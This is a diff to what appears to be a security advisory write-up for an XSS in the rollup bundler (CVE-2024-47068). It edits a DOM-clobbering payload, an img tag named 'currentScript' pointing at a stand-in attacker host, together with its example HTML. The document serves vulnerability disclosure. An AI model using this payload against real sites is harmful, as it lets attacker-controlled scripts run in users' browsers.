@@ -5,9 +5,9 @@
 + Library: rollup
 + Version: v4.21.3
 + Stars: 25.2K
-+ Payload: ```<img src="https://xxx.xxx.xxx" name="currentScript">```
++ Payload: ```<img src="https://attack.hulk" name="currentScript">```
 + Impact: XSS
-+ CVE: CVE-2024-47068
++ CVE: [CVE-2024-47068](https://github.com/advisories/GHSA-gcx4-mw62-g8wm)
 + Status: Fixed
 + Foundby: TheHulk
 
@@ -38,7 +38,7 @@ document.head.append(s)
 example html:
 
 <!-- ```html
-<img name="currentScript" src="//xxx.xxx.xxx"></img>
+<img name="currentScript" src="//attack.hulk"></img>
 <script src="dist/index.js"></script>
 ``` -->
 
